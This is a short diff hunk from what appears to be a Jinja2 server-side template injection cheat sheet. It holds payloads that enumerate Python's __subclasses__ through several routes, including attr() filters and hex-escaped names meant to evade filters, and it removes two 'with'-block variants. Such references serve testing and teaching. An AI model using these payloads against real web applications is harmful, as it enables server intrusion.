@@ -178,14 +178,12 @@ dict.__mro__[-1]
 {{ dict.mro()[-1].__subclasses__() }}
 {{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}
 
-{% w ith a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %} # w ith사이에 공백 제거할 것
 
 # Other examples using these ways
 {{ ().__class__.__base__.__subclasses__() }}
 {{ [].__class__.__mro__[-1].__subclasses__() }}
 {{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
 {{ request.__class__.mro()[-1].__subclasses__() }}
-{% w ith a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
 ```
 
 # Bypass SSTI Filtering
